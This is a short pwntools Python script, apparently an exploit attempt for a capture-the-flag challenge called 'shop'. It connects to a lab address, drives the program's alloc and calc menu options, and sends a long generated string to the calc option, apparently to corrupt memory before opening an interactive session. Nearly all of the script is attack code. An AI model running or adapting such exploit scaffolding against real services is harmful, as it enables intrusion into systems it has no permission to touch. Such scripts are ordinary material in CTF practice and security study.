from pwn import *
import random
s = remote('192.168.33.10',1234)
# = remote('shop.chal.pwning.xxx',9916)
s.recvuntil('name:')
s.send('woojin\n')
def alloc(dat1,dat2,f):
  s.recvuntil('>')
  s.sendline('a')
  s.sendline(dat1)
  s.sendline(dat2)
  s.sendline(str(f))
def calc(dat1):
  s.recvuntil('>')
  s.sendline('c')
  s.sendline(dat1)
table = list("123456789abcdef")
k = list()
for i in table:
  dat = i
  for i2 in table:
    dat += i2
    for i3 in table:
      dat += i3
      for i4 in table:
        dat += i4
        k.append(dat)

alloc("1234","1234",1.1)

calc("".join(k[:0x1000]))
s.interactive()
